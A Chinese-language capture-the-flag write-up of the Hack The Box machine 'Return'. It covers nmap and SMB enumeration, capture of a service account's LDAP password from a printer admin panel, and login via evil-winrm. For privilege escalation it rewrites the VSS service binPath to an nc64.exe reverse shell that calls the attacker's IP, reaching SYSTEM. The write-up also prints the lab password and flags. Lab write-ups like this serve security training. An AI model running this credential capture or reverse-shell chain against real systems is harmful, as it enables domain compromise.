---
title: HTB-Return Writeup
date: 2026-04-20T14:00:00+08:00
draft: false
toc: true
images:
tags:
  - Hack
  - Writeup
  - HTB
---
## 初始侦察

### Nmap 端口扫描

```bash
┌──(kali㉿kali)-[~/Work/Kali/Return]
└─$ sudo nmap --min-rate 10000 -p- 10.129.95.241 -oA Nmap/ports
[sudo] password for kali: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-20 02:48 -0400
Warning: 10.129.95.241 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.95.241
Host is up (0.14s latency).
Not shown: 65494 closed tcp ports (reset)
PORT      STATE    SERVICE
53/tcp    open     domain
80/tcp    open     http
88/tcp    open     kerberos-sec
135/tcp   open     msrpc
139/tcp   open     netbios-ssn
389/tcp   open     ldap
445/tcp   open     microsoft-ds
464/tcp   open     kpasswd5
593/tcp   open     http-rpc-epmap
636/tcp   open     ldapssl
1026/tcp  filtered LSA-or-nterm
3023/tcp  filtered magicnotes
3268/tcp  open     globalcatLDAP
3269/tcp  open     globalcatLDAPssl
5985/tcp  open     wsman
6323/tcp  filtered unknown
9389/tcp  open     adws
15041/tcp filtered unknown
16451/tcp filtered unknown
22252/tcp filtered unknown
23102/tcp filtered unknown
27459/tcp filtered unknown
38214/tcp filtered unknown
43356/tcp filtered unknown
46789/tcp filtered unknown
47001/tcp open     winrm
49664/tcp open     unknown
49665/tcp open     unknown
49666/tcp open     unknown
49667/tcp open     unknown
49671/tcp open     unknown
49674/tcp open     unknown
49675/tcp open     unknown
49677/tcp open     unknown
49680/tcp open     unknown
49688/tcp open     unknown
49699/tcp open     unknown
52171/tcp filtered unknown
56654/tcp filtered unknown
57578/tcp filtered unknown
58075/tcp filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 18.45 seconds

```

提取端口做备用。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Return]
└─$ grep open Nmap/ports.nmap | awk -F '/' '{print $1}' | paste -sd ','
53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49674,49675,49677,49680,49688,49699
```

### Nmap 详细信息扫描

```bash
┌──(kali㉿kali)-[~/Work/Kali/Return]
└─$ sudo nmap -sT -sC -sV -O -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49674,49675,49677,49680,49688,49699 10.129.95.241 
[sudo] password for kali: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-20 02:51 -0400
Nmap scan report for 10.129.95.241
Host is up (0.13s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: HTB Printer Admin Panel
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-20 07:10:37Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
49688/tcp open  msrpc         Microsoft Windows RPC
49699/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2016 (96%), Microsoft Windows Server 2019 (96%), Microsoft Windows 10 (93%), Microsoft Windows 10 1709 - 21H2 (93%), Microsoft Windows 10 21H1 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Server 2022 (93%), Microsoft Windows 10 1903 (92%), Windows Server 2019 (92%), Microsoft Windows Vista SP1 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 18m34s
| smb2-time: 
|   date: 2026-04-20T07:11:41
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 85.77 seconds

```

扫描表明靶机是域控制器，开放 SMB 服务，且开放 80-Web 端口。

将扫描暴露出的域名解析至 `hosts`。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Return]
└─$ sudo bash -c 'echo "10.129.95.241 return.local" >> /etc/hosts'                                                                       
                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali/Return]
└─$ tail -n 1 /etc/hosts
10.129.95.241 return.local
```

## SMB 渗透

执行 smbmap 扫描靶机，无有价值的发现。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Return]
└─$ smbmap -H return.local                                     

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
[!] Access denied on 10.129.95.241, no fun for you...                                                                        
[*] Closed 1 connections
```

使用 enum4linux 进行扫描，同样无有价值的发现。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Return]                                                                                                                                                              
└─$ enum4linux-ng return.local 
[92mENUM4LINUX - next generation (v1.3.10)[0m

 ==========================
|    Target Information    |
 ==========================
[94m[*] Target ........... return.local[0m
[94m[*] Username ......... ''[0m
[94m[*] Random Username .. 'ogwvlemz'[0m
[94m[*] Password ......... ''[0m
[94m[*] Timeout .......... 10 second(s)[0m

 =====================================
|    Listener Scan on return.local    |
 =====================================
[94m[*] Checking LDAP[0m
[92m[+] LDAP is accessible on 389/tcp[0m
[94m[*] Checking LDAPS[0m
[92m[+] LDAPS is accessible on 636/tcp[0m
[94m[*] Checking SMB[0m
[92m[+] SMB is accessible on 445/tcp[0m
[94m[*] Checking SMB over NetBIOS[0m
[92m[+] SMB over NetBIOS is accessible on 139/tcp[0m

 ====================================================
|    Domain Information via LDAP for return.local    |
 ====================================================
[94m[*] Trying LDAP[0m
[92m[+] Appears to be root/parent DC[0m
[92m[+] Long domain name is: return.local[0m

 ===========================================================
|    NetBIOS Names and Workgroup/Domain for return.local    |
 ===========================================================
[91m[-] Could not get NetBIOS names information via 'nmblookup': timed out[0m

 =========================================
|    SMB Dialect Check on return.local    |
 =========================================
[94m[*] Trying on 445/tcp[0m
[92m[+] Supported dialects and settings:
Supported dialects:
  SMB 1.0: false
  SMB 2.0.2: true
  SMB 2.1: true
  SMB 3.0: true
  SMB 3.1.1: true
Preferred dialect: SMB 3.0
SMB1 only: false
SMB signing required: true[0m

 ===========================================================
|    Domain Information via SMB session for return.local    |
 ===========================================================
[94m[*] Enumerating via unauthenticated SMB session on 445/tcp[0m
[92m[+] Found domain information via SMB
NetBIOS computer name: PRINTER
NetBIOS domain name: RETURN
DNS domain: return.local
FQDN: printer.return.local
Derived membership: domain member
Derived domain: RETURN[0m

 =========================================
|    RPC Session Check on return.local    |
 =========================================
[94m[*] Check for anonymous access (null session)[0m
[92m[+] Server allows authentication via username '' and password ''[0m
[94m[*] Check for guest access[0m
[91m[-] Could not establish guest session: STATUS_LOGON_FAILURE[0m

 ===================================================
|    Domain Information via RPC for return.local    |
 ===================================================
[92m[+] Domain: RETURN[0m
[92m[+] Domain SID: S-1-5-21-3750359090-2939318659-876128439[0m
[92m[+] Membership: domain member[0m

 ===============================================
|    OS Information via RPC for return.local    |
 ===============================================
[94m[*] Enumerating via unauthenticated SMB session on 445/tcp[0m
[92m[+] Found OS information via SMB[0m
[94m[*] Enumerating via 'srvinfo'[0m
[91m[-] Could not get OS info via 'srvinfo': STATUS_ACCESS_DENIED[0m
[92m[+] After merging OS information we have the following result:
OS: Windows 10, Windows Server 2019, Windows Server 2016
OS version: '10.0'
OS release: '1809'
OS build: '17763'
Native OS: not supported
Native LAN manager: not supported
Platform id: null
Server type: null
Server type string: null[0m

 =====================================
|    Users via RPC on return.local    |
 =====================================
[94m[*] Enumerating users via 'querydispinfo'[0m
[91m[-] Could not find users via 'querydispinfo': STATUS_ACCESS_DENIED[0m
[94m[*] Enumerating users via 'enumdomusers'[0m
[91m[-] Could not find users via 'enumdomusers': STATUS_ACCESS_DENIED[0m

 ======================================
|    Groups via RPC on return.local    |
 ======================================
[94m[*] Enumerating local groups[0m
[91m[-] Could not get groups via 'enumalsgroups domain': STATUS_ACCESS_DENIED[0m
[94m[*] Enumerating builtin groups[0m
[91m[-] Could not get groups via 'enumalsgroups builtin': STATUS_ACCESS_DENIED[0m
[94m[*] Enumerating domain groups[0m
[91m[-] Could not get groups via 'enumdomgroups': STATUS_ACCESS_DENIED[0m

 ======================================
|    Shares via RPC on return.local    |
 ======================================
[94m[*] Enumerating shares[0m
[92m[+] Found 0 share(s) for user '' with password '', try a different user[0m

 =========================================
|    Policies via RPC for return.local    |
 =========================================
[94m[*] Trying port 445/tcp[0m
[91m[-] SMB connection error on port 445/tcp: STATUS_ACCESS_DENIED[0m
[94m[*] Trying port 139/tcp[0m
[91m[-] SMB connection error on port 139/tcp: session failed[0m

 =========================================
|    Printers via RPC for return.local    |
 =========================================
[91m[-] Could not get printer info via 'enumprinters': STATUS_ACCESS_DENIED[0m

Completed after 37.47 seconds

```

## 80-Web 渗透

打开 80-Web 界面，显示为打印机管理面板。

![](Pasted%20image%2020260420151703.png)

在 `Settings` 界面暴露出许多令人感兴趣的信息。

![](Pasted%20image%2020260420151754.png)

使用 nc 监听 389 端口，同时将 `Server Address` 修改为 Kali 的地址然后 `Update`。
![](Pasted%20image%2020260420153904.png)

收到了用户 `svc-printer` 的密码为 `1edFg43012!!`。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Return]
└─$ sudo nc -lvnp 389                                          
[sudo] password for kali: 
listening on [any] 389 ...
connect to [10.10.16.58] from (UNKNOWN) [10.129.95.241] 59253
0*`%return\svc-printer�
                       1edFg43012!!

```

使用 crackmapexec 验证凭据的正确性，显示为 pwn。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Return]
└─$ crackmapexec smb 10.129.95.241 -u svc-printer -p '1edFg43012!!' -d return.local
SMB         10.129.95.241   445    PRINTER          [*] Windows 10 / Server 2019 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)
SMB         10.129.95.241   445    PRINTER          [+] return.local\svc-printer:1edFg43012!!
```

## Windows 提权

使用 evil-winrm 登陆 `svc-printer`，获得 `user flag`。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Return]
└─$ evil-winrm -i return.local -u svc-printer -p '1edFg43012!!'    
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-printer\Documents> whoami
return\svc-printer
*Evil-WinRM* PS C:\Users\svc-printer\Documents> gci c:\Users\ -Filter *.txt -File -Recurse


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        4/20/2026  12:00 AM             34 root.txt


    Directory: C:\Users\svc-printer\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        4/20/2026  12:00 AM             34 user.txt
*Evil-WinRM* PS C:\Users\svc-printer\Documents> type C:\Users\svc-printer\Desktop\user.txt
14d2a15d0700b5cc7a061***********9
```

查看用户所在组与权限。

```bash
*Evil-WinRM* PS C:\programdata\apps> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Server Operators                   Alias            S-1-5-32-549 Mandatory group, Enabled by default, Enabled group
BUILTIN\Print Operators                    Alias            S-1-5-32-550 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288
```

```bash
*Evil-WinRM* PS C:\Users\svc-printer\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeLoadDriverPrivilege         Load and unload device drivers      Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled
```

`SeBackupPrivilege + SeLoadDriverPrivilege + SeMachineAccountPrivilege + SeSystemtimePrivilege + SeRemoteShutdownPrivilege` 是 `Server Operators` 组的典型权限集合，这个组有 `SeBackup` 可以读取文件，但不能执行 AD 备份。

可以验证一下。

```bash
*Evil-WinRM* PS C:\programdata\apps> whoami /groups | findstr /i "operators"
BUILTIN\Server Operators                   Alias            S-1-5-32-549 Mandatory group, Enabled by default, Enabled group
BUILTIN\Print Operators                    Alias            S-1-5-32-550 Mandatory group, Enabled by default, Enabled group

```

看到 `BUILTIN\Server Operators`。

在 Kali 中准备 `nc64.exe`。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Return]
└─$ ls -liah nc64.exe 
2764094 -rwxrwxr-x 1 kali kali 45K Apr 20 09:14 nc64.exe
```

上传至靶机。

```bash
*Evil-WinRM* PS C:\programdata\apps> upload nc64.exe
                                        
Info: Uploading /home/kali/Work/Kali/Return/nc64.exe to C:\programdata\apps\nc64.exe
                                        
Data: 60360 bytes of 60360 bytes copied
                                        
Info: Upload successful!
```

在 Windows 每个服务中都有一个叫 `binPath` 的字段，里面是服务启动时要执行的命令行。服务控制管理器（SCM）启动服务时就是拿这个字符串直接 `CreateProcess` 运行的。

将 VSS 服务的 `binPath` 改为反弹 Shell 命令，执行它。

```bash
*Evil-WinRM* PS C:\programdata\apps> sc.exe config VSS binPath="C:\programdata\apps\nc64.exe -e cmd.exe 10.10.16.58 443"
[SC] ChangeServiceConfig SUCCESS
*Evil-WinRM* PS C:\programdata\apps> sc.exe qc VSS
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: VSS
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\programdata\apps\nc64.exe -e cmd.exe 10.10.16.58 443
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Volume Shadow Copy
        DEPENDENCIES       : RPCSS
        SERVICE_START_NAME : LocalSystem
*Evil-WinRM* PS C:\programdata\apps> sc.exe start VSS
[SC] StartService FAILED 1053:
```

在 Kali 中建立好监听，获得 `administrator`。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Return]
└─$ sudo rlwrap -cAr nc -lvnp 443
[sudo] password for kali: 
listening on [any] 443 ...
connect to [10.10.16.58] from (UNKNOWN) [10.129.95.241] 52506
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>type c:\Users\Administrator\Desktop\root.txt
type c:\Users\Administrator\Desktop\root.txt
2a7d4194a15ccda2faf1cd0114a8ec20

```
